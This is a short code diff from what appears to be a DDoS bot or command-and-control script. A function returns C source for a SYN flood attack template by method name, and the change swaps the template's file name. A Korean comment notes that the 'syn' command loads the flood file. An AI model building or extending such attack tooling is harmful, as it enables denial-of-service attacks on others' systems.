@@ -56,7 +56,7 @@ def heartbeat(sock):
 def get_c_source_code(method):
     # syn 명령은 templates/syn_flood_loop.c 파일을 가져옴
     if method == "syn":
-        return open("templates/syn_flood_loop.c").read()
+        return open("templates/syn_flood.c").read()
     return "// unknown attack"
 
 if __name__ == "__main__":
